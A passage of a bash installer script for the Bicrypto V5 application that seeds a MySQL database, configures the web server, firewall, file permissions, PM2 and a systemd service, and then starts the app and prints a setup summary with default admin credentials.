            -- Convert to InnoDB if using MyISAM (which has size limits)
            ALTER TABLE permission ENGINE=InnoDB;
            
            -- Increase table limits
            SET SESSION sql_mode = '';
            SET GLOBAL sql_mode = '';
            SET GLOBAL max_allowed_packet = 1073741824;
        " 2>/dev/null || true
        
        # Retry seeding
        if ! pnpm seed; then
            print_error "Database seeding failed after retry"
            print_warning "The 'table is full' error usually means:"
            print_info "  1. Disk space is full - check with: df -h"
            print_info "  2. MySQL tmp directory is full - check: /tmp or /var/lib/mysql/tmp"
            print_info "  3. Table size limit reached (MyISAM tables)"
            print_info ""
            print_info "To fix manually:"
            print_info "  1. Free up disk space if needed"
            print_info "  2. Clear MySQL tmp: rm -f /tmp/#sql* /var/lib/mysql/tmp/*"
            print_info "  3. Convert tables to InnoDB: ALTER TABLE permission ENGINE=InnoDB;"
            print_info "  4. Then run: pnpm seed"
            # Don't exit, as the app might still work without full seeding
        else
            print_success "Database seeded successfully on retry"
        fi
    else
        print_success "Database seeded successfully"
    fi
    
    # Restore MySQL settings (optional, for security)
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "
        SET GLOBAL sql_mode = 'STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION';
    " 2>/dev/null || true
    
    print_success "Application build completed successfully"
}

# =============================================================================
# 🌐 Web Server Configuration
# =============================================================================

configure_webserver() {
    print_step 9 "WEB SERVER" "Configuring web server (Apache/Nginx)..."
    
    # Detect web server
    if systemctl is-active --quiet apache2 2>/dev/null || systemctl is-active --quiet httpd 2>/dev/null; then
        configure_apache
    elif systemctl is-active --quiet nginx 2>/dev/null; then
        configure_nginx
    else
        print_warning "No active web server detected. You'll need to configure manually."
        return
    fi
}

configure_apache() {
    print_info "Configuring Apache..."
    
    # Enable required modules
    local modules=("proxy" "proxy_http" "proxy_wstunnel" "ssl" "rewrite")
    
    case $PACKAGE_MANAGER in
        apt)
            for module in "${modules[@]}"; do
                a2enmod "$module" >/dev/null 2>&1 || true
            done
            systemctl restart apache2
            ;;
        dnf|yum)
            # Modules are typically compiled in for RHEL/CentOS
            systemctl restart httpd
            ;;
    esac
    
    print_success "Apache configured successfully"
}

configure_nginx() {
    print_info "Configuring Nginx..."
    # Add Nginx configuration here if needed
    systemctl restart nginx
    print_success "Nginx configured successfully"
}

# =============================================================================
# 🔒 Security & Firewall
# =============================================================================

configure_security() {
    print_step 10 "SECURITY" "Configuring security and firewall settings..."
    
    # Configure firewall if available
    if command -v ufw >/dev/null 2>&1; then
        print_info "Configuring UFW firewall..."
        ufw --force enable
        ufw allow ssh
        ufw allow http
        ufw allow https
        ufw allow 3000  # Application port
        print_success "UFW firewall configured"
    elif command -v firewall-cmd >/dev/null 2>&1; then
        print_info "Configuring firewalld..."
        systemctl enable --now firewalld
        firewall-cmd --permanent --add-service=ssh
        firewall-cmd --permanent --add-service=http
        firewall-cmd --permanent --add-service=https
        firewall-cmd --permanent --add-port=3000/tcp
        firewall-cmd --reload
        print_success "Firewalld configured"
    else
        print_warning "No supported firewall found. Manual configuration may be required."
    fi
    
    # Set proper file permissions and ownership
    print_info "Setting file permissions and ownership..."
    
    # Detect the owner and group of the public_html folder (or current directory if not in public_html)
    local target_dir="."
    if [[ -d "../public_html" ]]; then
        target_dir="../public_html"
    elif [[ "$(basename $(pwd))" == "public_html" ]]; then
        target_dir="."
    elif [[ -d "public_html" ]]; then
        target_dir="public_html"
    fi
    
    local dir_owner=$(stat -c '%U' "$target_dir")
    local dir_group=$(stat -c '%G' "$target_dir")
    
    print_info "Detected directory owner: ${dir_owner}:${dir_group}"
    
    # Set ownership recursively to match the parent directory
    print_info "Setting file ownership to ${dir_owner}:${dir_group}..."
    chown -R "${dir_owner}:${dir_group}" .
    
    # Set proper permissions for security
    print_info "Setting file permissions (directories: 755, files: 644)..."
    find . -type d -exec chmod 755 {} \;
    find . -type f -exec chmod 644 {} \;
    
    # Make shell scripts executable
    find . -name "*.sh" -exec chmod 755 {} \;
    chmod 755 installer.sh 2>/dev/null || true
    
    # Secure sensitive files
    chmod 600 .env 2>/dev/null || true
    
    # Set specific permissions for important directories
    chmod 755 backend/logs 2>/dev/null || true
    chmod 755 frontend/public/uploads 2>/dev/null || true
    chmod 755 updates 2>/dev/null || true
    
    # Store the user for later use in application startup
    if ! grep -q "^APP_USER=" .env 2>/dev/null; then
        echo "APP_USER=${dir_owner}" >> .env
    fi
    
    # Fix .env file permissions after adding APP_USER
    chown "${dir_owner}:${dir_group}" .env 2>/dev/null || true
    chmod 600 .env 2>/dev/null || true
    
    print_success "File permissions and ownership configured correctly"
    
    print_success "Security configuration completed"
}

# =============================================================================
# 🔧 Utility Functions
# =============================================================================

fix_file_permissions() {
    print_info "Fixing file permissions and ownership..."
    
    # Clean build artifacts that might have permission issues
    print_info "Cleaning build artifacts with permission issues..."
    if [[ -d "frontend/.next" ]]; then
        print_info "Removing .next directory with permission issues..."
        chmod -R 755 "frontend/.next" 2>/dev/null || true
        rm -rf "frontend/.next" 2>/dev/null || true
    fi
    
    if [[ -d "backend/dist" ]]; then
        print_info "Removing backend dist directory with permission issues..."
        chmod -R 755 "backend/dist" 2>/dev/null || true
        rm -rf "backend/dist" 2>/dev/null || true
    fi
    
    # Detect the owner and group of the current directory
    local dir_owner=$(stat -c '%U' ".")
    local dir_group=$(stat -c '%G' ".")
    
    print_info "Setting file ownership to ${dir_owner}:${dir_group}..."
    chown -R "${dir_owner}:${dir_group}" .
    
    # Set proper permissions for security
    print_info "Setting file permissions (directories: 755, files: 644)..."
    find . -type d -exec chmod 755 {} \;
    find . -type f -exec chmod 644 {} \;
    
    # Make shell scripts executable
    find . -name "*.sh" -exec chmod 755 {} \;
    chmod 755 installer.sh 2>/dev/null || true
    
    # Secure sensitive files
    chmod 600 .env 2>/dev/null || true
    chmod 600 backend/config.js 2>/dev/null || true
    
    # Set specific permissions for important directories
    chmod 755 backend/logs 2>/dev/null || true
    chmod 755 frontend/public/uploads 2>/dev/null || true
    chmod 755 updates 2>/dev/null || true
    
    # Set write permissions for upload directories
    chmod 775 frontend/public/uploads 2>/dev/null || true
    find frontend/public/uploads -type d -exec chmod 775 {} \; 2>/dev/null || true
    find frontend/public/uploads -type f -exec chmod 664 {} \; 2>/dev/null || true
    
    print_success "File permissions and ownership fixed successfully"
}

# =============================================================================
# 🚀 Service Management
# =============================================================================

setup_process_manager() {
    print_step 11 "PROCESS MANAGER" "Setting up PM2 process manager..."
    
    # Install PM2 globally
    if ! command -v pm2 >/dev/null 2>&1; then
        npm install -g pm2
    fi
    
    # Create PM2 ecosystem file
    cat > ecosystem.config.js << EOF
module.exports = {
  apps: [{
    name: 'bicrypto-v5',
    script: 'pnpm',
    args: 'start',
    cwd: '$(pwd)',
    instances: 1,
    autorestart: true,
    watch: false,
    max_memory_restart: '1G',
    env: {
      NODE_ENV: 'production'
    }
  }]
};
EOF
    
    # Setup PM2 startup
    pm2 startup | tail -n 1 | bash || true
    
    print_success "PM2 process manager configured"
}

# =============================================================================
# ✅ Final Steps
# =============================================================================

finalize_installation() {
    print_step 12 "FINALIZATION" "Completing installation and starting application..."
    
    # Get the application user
    local app_user=""
    if [[ -f ".env" ]] && grep -q "^APP_USER=" .env; then
        app_user=$(grep "^APP_USER=" .env | cut -d'=' -f2)
    else
        app_user=$(stat -c '%U' ".")
    fi
    
    print_info "Finalizing installation for user: ${app_user}"
    
    # Function to run commands as the application user with proper environment
    run_as_app_user() {
        local cmd="$1"
        local full_path=$(pwd)
        
        # Ensure the user has access to Node.js and pnpm
        local node_path=$(which node)
        local npm_path=$(which npm)
        local pnpm_path=$(which pnpm)
        
        # Create a script that sets up the environment properly
        local temp_script=$(mktemp)
        cat > "$temp_script" << EOF
#!/bin/bash
export PATH="/usr/local/bin:/usr/bin:/bin:\$HOME/.local/bin:\$PATH"
export NODE_PATH="$node_path"
export NPM_PATH="$npm_path"
export PNPM_PATH="$pnpm_path"
cd "$full_path"
$cmd
EOF
        chmod +x "$temp_script"
        
        if [[ "$app_user" == "root" ]] || [[ -z "$app_user" ]]; then
            # If still root, run directly
            bash "$temp_script"
        else
            # Run as the specified user with proper environment
            su - "$app_user" -c "bash $temp_script"
        fi
        
        local exit_code=$?
        rm -f "$temp_script"
        return $exit_code
    }
    
    # Create a startup script for the application
    print_info "Creating application startup script..."
    local startup_script="/usr/local/bin/bicrypto-start"
    cat > "$startup_script" << EOF
#!/bin/bash
# Bicrypto V5 Application Startup Script

APP_DIR="$(pwd)"
APP_USER="$app_user"

# Function to start the application as the correct user
start_app() {
    if [[ "\$APP_USER" == "root" ]] || [[ -z "\$APP_USER" ]]; then
        cd "\$APP_DIR" && pnpm start
    else
        su - "\$APP_USER" -c "cd '\$APP_DIR' && export PATH=/usr/local/bin:/usr/bin:/bin:\\\$HOME/.local/bin:\\\$PATH && pnpm start"
    fi
}

# Start the application
echo "Starting Bicrypto V5 application..."
start_app
EOF
    chmod +x "$startup_script"
    print_success "Startup script created at $startup_script"
    
    # Create a systemd service for auto-start (optional)
    if command -v systemctl >/dev/null 2>&1; then
        print_info "Creating systemd service for auto-start..."
        cat > /etc/systemd/system/bicrypto.service << EOF
[Unit]
Description=Bicrypto V5 Application
After=network.target

[Service]
Type=simple
User=$app_user
WorkingDirectory=$(pwd)
Environment=PATH=/usr/local/bin:/usr/bin:/bin:/home/$app_user/.local/bin
Environment=NODE_ENV=production
ExecStart=/usr/local/bin/pnpm start
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
        
        # Reload systemd and enable the service
        systemctl daemon-reload
        systemctl enable bicrypto.service
        print_success "Systemd service created and enabled"
    fi
    
    # Start the application
    print_info "Starting the application..."
    
    # Kill any existing processes first
    pkill -f "pnpm start" 2>/dev/null || true
    pkill -f "node.*next" 2>/dev/null || true
    sleep 2
    
    # Start the application in the background
    print_info "Launching application server..."
    
    # Create a more robust startup script that handles user switching properly
    local startup_log="/tmp/bicrypto-startup.log"
    local startup_pid_file="/tmp/bicrypto-startup.pid"
    
    # Clean up any existing log and pid files
    rm -f "$startup_log" "$startup_pid_file"
    
    # Create a startup script that properly handles user environment
    local app_startup_script="/tmp/bicrypto-app-start.sh"
    cat > "$app_startup_script" << EOF
#!/bin/bash
# Bicrypto Application Startup Script

# Set up environment
export PATH="/usr/local/bin:/usr/bin:/bin:\$HOME/.local/bin:\$PATH"
export NODE_ENV=production

# Change to application directory
cd "$(pwd)"

# Start the application and capture the PID
echo "Starting Bicrypto V5 application as user: $app_user"
echo "Working directory: \$(pwd)"
echo "Node.js version: \$(node -v 2>/dev/null || echo 'Not found')"
echo "pnpm version: \$(pnpm -v 2>/dev/null || echo 'Not found')"
echo "Starting server..."

# Start pnpm in background and capture PID
pnpm start > "$startup_log" 2>&1 &
echo \$! > "$startup_pid_file"

# Keep the script running briefly to ensure startup
sleep 5
EOF
    
    chmod +x "$app_startup_script"
    
    # Execute the startup script as the application user
    if [[ "$app_user" == "root" ]] || [[ -z "$app_user" ]]; then
        # If running as root, execute directly
        bash "$app_startup_script" &
    else
        # Run as the specified user
        su - "$app_user" -c "bash $app_startup_script" &
    fi
    
    # Wait a moment for the startup script to execute
    sleep 3
    
    print_info "Application startup initiated..."
    
    # Wait and check if the application started successfully
    local max_attempts=30
    local attempt=0
    local app_started=false
    
    while [[ $attempt -lt $max_attempts ]]; do
        sleep 2
        attempt=$((attempt + 1))
        
        # Check if the process is running by looking for the PID file and process
        if [[ -f "$startup_pid_file" ]]; then
            local app_pid=$(cat "$startup_pid_file" 2>/dev/null)
            if [[ -n "$app_pid" ]] && kill -0 "$app_pid" 2>/dev/null; then
                # Process is running, now check if it's responding
                if command -v curl >/dev/null 2>&1; then
                    if curl -s http://localhost:3000 >/dev/null 2>&1; then
                        app_started=true
                        break
                    fi
                elif command -v wget >/dev/null 2>&1; then
                    if wget -q --spider http://localhost:3000 >/dev/null 2>&1; then
                        app_started=true
                        break
                    fi
                elif netstat -tuln 2>/dev/null | grep -q ":3000"; then
                    app_started=true
                    break
                elif ss -tuln 2>/dev/null | grep -q ":3000"; then
                    app_started=true
                    break
                fi
            fi
        fi
        
        # Also check for pnpm or node processes as fallback
        if pgrep -f "pnpm start" > /dev/null || pgrep -f "node.*next" > /dev/null; then
            # Check if responding on port 3000
            if netstat -tuln 2>/dev/null | grep -q ":3000" || ss -tuln 2>/dev/null | grep -q ":3000"; then
                app_started=true
                break
            fi
        fi
        
        printf "."
    done
    
    echo ""
    
    if [[ $app_started == true ]]; then
        print_success "✅ Application started successfully!"
        print_success "🌐 Server is running on http://localhost:3000"
        
        # Show startup log if there are any important messages
        if [[ -f "$startup_log" ]]; then
            local log_size=$(wc -l < "$startup_log" 2>/dev/null || echo "0")
            if [[ $log_size -gt 0 ]]; then
                print_info "Startup log (last 10 lines):"
                tail -10 "$startup_log" 2>/dev/null | sed 's/^/  /' || true
            fi
        fi
        
        # Show the process information
        if [[ -f "$startup_pid_file" ]]; then
            local app_pid=$(cat "$startup_pid_file" 2>/dev/null)
            if [[ -n "$app_pid" ]]; then
                print_info "Application PID: $app_pid"
            fi
        fi
    else
        print_warning "⚠️  Application may not have started correctly"
        print_info "You can check the startup log: cat $startup_log"
        print_info "Or start manually with: pnpm start"
        
        # Show the error log
        if [[ -f "$startup_log" ]]; then
            print_info "Startup log:"
            cat "$startup_log" 2>/dev/null | sed 's/^/  /' || true
        fi
        
        # Show any process information for debugging
        print_info "Process check:"
        echo "  pnpm processes: $(pgrep -f 'pnpm start' | wc -l)"
        echo "  node processes: $(pgrep -f 'node.*next' | wc -l)"
        echo "  Port 3000 status: $(netstat -tuln 2>/dev/null | grep -c ':3000' || echo '0')"
    fi
    
    # Clean up temporary files
    rm -f "$app_startup_script"
    
    # Calculate installation time
    local end_time=$(date +%s)
    local duration=$((end_time - INSTALLATION_START_TIME))
    local minutes=$((duration / 60))
    local seconds=$((duration % 60))
    
    print_success "Installation completed in ${minutes}m ${seconds}s"
}

# =============================================================================
# 📊 Installation Summary
# =============================================================================

show_installation_summary() {
    clear
    echo -e "${GREEN}${BOLD}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  🎉 INSTALLATION COMPLETED SUCCESSFULLY! 🎉                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    
    echo -e "${WHITE}${BOLD}🚀 Bicrypto V5 is now ready!${NC}\n"
    
    echo -e "${CYAN}${BOLD}📋 INSTALLATION SUMMARY${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}• Site URL:${NC}        ${GREEN}$(grep "^NEXT_PUBLIC_SITE_URL=" .env | cut -d'=' -f2)${NC}"
    echo -e "${WHITE}• Site Name:${NC}      ${GREEN}$(grep "^NEXT_PUBLIC_SITE_NAME=" .env | cut -d'=' -f2)${NC}"
    echo -e "${WHITE}• Database:${NC}       ${GREEN}$(grep "^DB_NAME=" .env | cut -d'=' -f2)${NC}"
    echo -e "${WHITE}• Node.js:${NC}        ${GREEN}$(node -v)${NC}"
    echo -e "${WHITE}• pnpm:${NC}           ${GREEN}$(pnpm -v)${NC}"
    echo -e "${WHITE}• Redis:${NC}          ${GREEN}Running${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    echo -e "${YELLOW}${BOLD}🔐 ADMIN CREDENTIALS${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}• Email:${NC}          ${GREEN}superadmin@example.com${NC}"
    echo -e "${WHITE}• Password:${NC}       ${GREEN}12345678${NC}"
    echo -e "${WHITE}• Admin Panel:${NC}    ${GREEN}$(grep "^NEXT_PUBLIC_SITE_URL=" .env | cut -d'=' -f2)/admin${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    echo -e "${PURPLE}${BOLD}⚡ QUICK COMMANDS${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}• Start Server:${NC}   ${CYAN}pnpm start${NC} ${YELLOW}(or)${NC} ${CYAN}systemctl start bicrypto${NC}"
    echo -e "${WHITE}• Stop Server:${NC}    ${CYAN}pkill -f 'pnpm start'${NC} ${YELLOW}(or)${NC} ${CYAN}systemctl stop bicrypto${NC}"
    echo -e "${WHITE}• View Logs:${NC}      ${CYAN}cat /tmp/bicrypto-startup.log${NC}"
    echo -e "${WHITE}• Restart:${NC}        ${CYAN}systemctl restart bicrypto${NC}"
    echo -e "${WHITE}• Service Status:${NC} ${CYAN}systemctl status bicrypto${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    echo -e "${RED}${BOLD}⚠️  IMPORTANT SECURITY NOTES${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}• Change the default admin password immediately after first login${NC}"
    echo -e "${YELLOW}• Configure SSL certificates for production use${NC}"
    echo -e "${YELLOW}• Review and update firewall settings as needed${NC}"
    echo -e "${YELLOW}• Keep your system and dependencies updated regularly${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    echo -e "${WHITE}${BOLD}📞 Support: ${BLUE}https://support.mash3div.com${NC}"
    echo -e "${WHITE}${BOLD}📖 Documentation: ${BLUE}https://docs.bicrypto.com${NC}\n"
    
    echo -e "${GREEN}${BOLD}Thank you for choosing Bicrypto V5! 🚀${NC}\n"
}

# =============================================================================
# 🎯 Main Installation Flow
# =============================================================================

main() {
    INSTALLATION_START_TIME=$(date +%s)
    
    # Setup logging
    exec 1> >(tee -a "$INSTALLATION_LOG")
    exec 2> >(tee -a "$INSTALLATION_LOG" >&2)
    
    # Show banner
    print_banner
    
    # Confirm installation
    echo -e "${YELLOW}${BOLD}This will install Bicrypto V5 with all required dependencies.${NC}"
    echo -e "${WHITE}The installation process will take 10-15 minutes.${NC}\n"
    
    read -p "$(echo -e ${WHITE}Continue with installation? [Y/n]: ${NC})" -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]] && [[ ! -z $REPLY ]]; then
        echo -e "${RED}Installation cancelled.${NC}"
        exit 0
    fi
    
    # Execute installation steps
    detect_system
    check_system_user
    sleep 1
    show_progress 1 $TOTAL_STEPS
    sleep 1
    
    check_system_requirements  
    sleep 1
    show_progress 2 $TOTAL_STEPS
    sleep 1
    
    # Fix common Ubuntu PPA issues before installing dependencies
    fix_ubuntu_ppa_issues
    
    install_dependencies
    sleep 1
    show_progress 3 $TOTAL_STEPS
    sleep 1
    
    install_nodejs
    sleep 1
    show_progress 4 $TOTAL_STEPS
    sleep 1
    
    install_pnpm
    sleep 1
    show_progress 5 $TOTAL_STEPS
    sleep 1
    
    install_redis
    sleep 1
    show_progress 6 $TOTAL_STEPS
    sleep 1
    
    configure_database
    sleep 1
    show_progress 7 $TOTAL_STEPS
    sleep 1
    
    build_application
    sleep 1
    show_progress 8 $TOTAL_STEPS
    sleep 1
    
    configure_webserver
    sleep 1
    show_progress 9 $TOTAL_STEPS
    sleep 1
    
    configure_security
    sleep 1
    show_progress 10 $TOTAL_STEPS
    sleep 1
    
    setup_process_manager
    sleep 1
    show_progress 11 $TOTAL_STEPS
    sleep 1
    
    finalize_installation
    sleep 1
    show_progress 12 $TOTAL_STEPS
    sleep 1
    
    echo -e "\n"
    
    # Show final summary
    show_installation_summary
}

# =============================================================================
# 🚦 Script Entry Point
# =============================================================================

# =============================================================================
# 🌱 Seed Only Function
# =============================================================================

seed_only() {
    INSTALLATION_START_TIME=$(date +%s)
    
    print_banner
    echo -e "${YELLOW}${BOLD}🌱 DATABASE SEED ONLY MODE${NC}"
    echo -e "${WHITE}This will import initial.sql and seed the database without building.${NC}\n"
    
    # Check if .env exists
    if [[ ! -f ".env" ]]; then
        print_error "No .env file found. Please run full installation first or create .env manually."
        exit 1
    fi
    
    # Get database credentials from .env
    print_info "Reading database configuration..."
    DB_USER=$(grep "^DB_USER=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
    DB_PASSWORD=$(grep "^DB_PASSWORD=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
    DB_HOST=$(grep "^DB_HOST=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
    DB_PORT=$(grep "^DB_PORT=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
    DB_NAME=$(grep "^DB_NAME=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
    
    # Test database connection
    print_info "Testing database connection..."
    if mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "SELECT 1;" >/dev/null 2>&1; then
        print_success "Database connection successful"
    else
        print_error "Database connection failed. Please check your credentials in .env"
        exit 1
    fi
    
    # Import initial SQL if exists
    if [[ -f "initial.sql" ]]; then
        import_initial_sql
    else
        print_warning "No initial.sql file found, skipping import"
    fi
    
    # Run database seeding
    print_step 1 "DATABASE SEEDING" "Seeding database with initial data..."
    
    # Fix common MySQL storage issues before seeding
    print_info "Preparing MySQL for seeding..."
    
    # Increase MySQL limits and fix storage issues
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "
        SET GLOBAL max_heap_table_size = 1073741824;
        SET GLOBAL tmp_table_size = 1073741824;
        SET GLOBAL sql_mode = 'NO_ENGINE_SUBSTITUTION';
    " 2>/dev/null || true
    
    # Clear any existing permission table that might be full
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" -e "
        TRUNCATE TABLE IF EXISTS permission;
        OPTIMIZE TABLE permission;
    " 2>/dev/null || true
    
    # Run seed
    if ! pnpm seed; then
        print_warning "Database seeding failed, attempting to fix and retry..."
        
        # Try more aggressive fixes for table full errors
        mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" -e "
            -- Clear potentially problematic tables
            TRUNCATE TABLE permission;
            TRUNCATE TABLE role_permission;
            
            -- Convert to InnoDB if using MyISAM (which has size limits)
            ALTER TABLE permission ENGINE=InnoDB;
            
            -- Increase table limits
            SET SESSION sql_mode = '';
            SET GLOBAL sql_mode = '';
            SET GLOBAL max_allowed_packet = 1073741824;
        " 2>/dev/null || true
        
        # Retry seeding
        if ! pnpm seed; then
            print_error "Database seeding failed after retry"
            print_warning "The 'table is full' error usually means:"
            print_info "  1. Disk space is full - check with: df -h"
            print_info "  2. MySQL tmp directory is full - check: /tmp or /var/lib/mysql/tmp"
            print_info "  3. Table size limit reached (MyISAM tables)"
            print_info ""
            print_info "To fix manually:"
            print_info "  1. Free up disk space if needed"
            print_info "  2. Clear MySQL tmp: rm -f /tmp/#sql* /var/lib/mysql/tmp/*"
            print_info "  3. Convert tables to InnoDB: ALTER TABLE permission ENGINE=InnoDB;"
            print_info "  4. Then run: pnpm seed"
        else
            print_success "Database seeded successfully on retry"
        fi
    else
        print_success "Database seeded successfully"
    fi
    
    # Continue with post-seed tasks
    print_step 2 "POST-SEED TASKS" "Completing remaining setup tasks..."
    
    # Configure web server
    configure_webserver
    
    # Configure security
    configure_security
    
    # Setup process manager
    setup_process_manager
    
    # Finalize installation
    finalize_installation
    
    # Calculate installation time
    local end_time=$(date +%s)
    local duration=$((end_time - INSTALLATION_START_TIME))
    local minutes=$((duration / 60))
    local seconds=$((duration % 60))
    
    print_success "Seed-only process completed in ${minutes}m ${seconds}s"
    
    # Show summary
    echo -e "\n${GREEN}${BOLD}✅ DATABASE SEEDING COMPLETED${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}• Database:${NC}       ${GREEN}$DB_NAME seeded successfully${NC}"
    echo -e "${WHITE}• Admin Email:${NC}    ${GREEN}superadmin@example.com${NC}"
    echo -e "${WHITE}• Admin Password:${NC} ${GREEN}12345678${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
}

# =============================================================================
# 🧹 Build Cleanup Function
# =============================================================================

clean_build_artifacts() {
    print_info "Cleaning build artifacts and fixing permissions..."
    
    # Clean .next directory
    if [[ -d "frontend/.next" ]]; then
        print_info "Removing .next directory..."
        chmod -R 755 "frontend/.next" 2>/dev/null || true
        rm -rf "frontend/.next" 2>/dev/null || {
            print_warning "Could not remove .next directory completely, some files may remain"
        }
        print_success ".next directory cleaned"
    else
        print_info "No .next directory found"
    fi
    
    # Clean backend dist directory
    if [[ -d "backend/dist" ]]; then
        print_info "Removing backend dist directory..."
        chmod -R 755 "backend/dist" 2>/dev/null || true
        rm -rf "backend/dist" 2>/dev/null || true
        print_success "Backend dist directory cleaned"
    else
        print_info "No backend dist directory found"
    fi
    
    # Clean node_modules cache and lock files if they exist
    if [[ -d "node_modules" ]]; then
        print_info "Cleaning node_modules..."
        rm -rf "node_modules" 2>/dev/null || true
    fi
    
    if [[ -d "frontend/node_modules" ]]; then
        print_info "Cleaning frontend node_modules..."
        rm -rf "frontend/node_modules" 2>/dev/null || true
    fi
    
    if [[ -d "backend/node_modules" ]]; then
        print_info "Cleaning backend node_modules..."
        rm -rf "backend/node_modules" 2>/dev/null || true
    fi
    
    # Clean pnpm lock files
    rm -f "pnpm-lock.yaml" 2>/dev/null || true
    rm -f "frontend/pnpm-lock.yaml" 2>/dev/null || true
    rm -f "backend/pnpm-lock.yaml" 2>/dev/null || true
    
    print_success "Build artifacts cleaned successfully"
    print_info "You can now run the installer or build commands again"
}

# Handle command line arguments
case "${1:-}" in
    --seed-only)
        echo -e "${BLUE}${BOLD}🌱 Running Database Seed Only Mode${NC}"
        seed_only
        exit 0
        ;;
    --fix-permissions)
        echo -e "${BLUE}${BOLD}🔧 Fixing File Permissions${NC}"
        fix_file_permissions
        exit 0
        ;;
    --clean-build)
        echo -e "${BLUE}${BOLD}🧹 Cleaning Build Artifacts${NC}"
        clean_build_artifacts
        exit 0
        ;;
    --help|-h)
        echo -e "${WHITE}${BOLD}Bicrypto V5 Installer${NC}"
        echo -e "${CYAN}Usage: $0 [OPTIONS]${NC}"
        echo ""
        echo -e "${WHITE}Options:${NC}"
        echo -e "  ${CYAN}--seed-only${NC}          Import initial.sql and seed database (skip build)"
        echo -e "  ${CYAN}--fix-permissions${NC}    Fix file and directory permissions"
        echo -e "  ${CYAN}--clean-build${NC}        Clean build artifacts (.next, dist, node_modules)"
        echo -e "  ${CYAN}--help, -h${NC}           Show this help message"
        echo ""
        echo -e "${WHITE}Examples:${NC}"
        echo -e "  ${CYAN}$0${NC}                   Run full installation (includes automatic cleanup)"
        echo -e "  ${CYAN}$0 --seed-only${NC}       Import database and seed only (after build is done)"
        echo -e "  ${CYAN}$0 --fix-permissions${NC} Fix file permissions only"
        echo -e "  ${CYAN}$0 --clean-build${NC}     Manual cleanup of build artifacts only"
        exit 0
        ;;
    "")
        # No arguments, run main installation
        main "$@"
        ;;
    *)
        echo -e "${RED}Error: Unknown option '$1'${NC}"
        echo -e "${WHITE}Use '$0 --help' for usage information.${NC}"
        exit 1
        ;;
esac 